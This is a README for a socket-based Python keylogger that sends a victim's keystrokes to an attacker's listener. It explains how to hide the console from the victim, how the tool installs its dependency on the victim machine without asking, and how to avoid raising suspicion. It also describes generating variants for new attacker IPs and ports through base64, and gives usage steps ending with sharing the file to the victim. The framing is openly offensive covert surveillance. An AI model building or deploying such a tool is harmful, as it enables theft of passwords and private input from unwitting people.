# socKeTylogger

This script is a simple keylogger, that by means of sockets, sends the pressed keys to a remote machine that would have to be in listen, for that there is the server folder, that contains the script listener.py, so that this script has more power change the extension of the file from .py to .pyw, so that the victim does not see the terminal when the script is started.

## This script has by default the functionality to write in a file all the keys pressed, you can comment that line if you want, because that could generate suspicions.

## More about the script
The keylogger when executed automatically installs the **pynput** library on the victim machine, so there is no need to depend on the victim having the pynput library installed.


The **autoChange.sh** script plays with base64 to generate a file in python3 that generates another keylogger, this is functional when we make a change in the keylogger, but the real utility of this script called **autoChange.sh** is that the file it generates, called **keyloggerGenerator.py**, allows us to generate several keyloggers to operate with another ip and port if we want to.


The keylogger.py file has a variable called ending_key, this variable is responsible for stopping the server when the key combination **CTRL + SHIFT + ESC** is detected. You can also modify the keyboard combination, so that when key combination is detected the keylogger stops.
## Requirements:
```
pip install -r requirements.txt
```
## Usage:
``` 
./autoChange.sh
python3 keyloggerGenerator.py <attacker ip> <attacker port> <keylogger filename>
**Before sharing the file, put yourself in listening mode by running the following command**
cd server
python3 listener.py <listener port>
**Remember, the port must be the same port that the victim will use to connect to your computer.**
Now share the file to the victim machine and wait for it to connect to your server to receive the keystrokes.
```
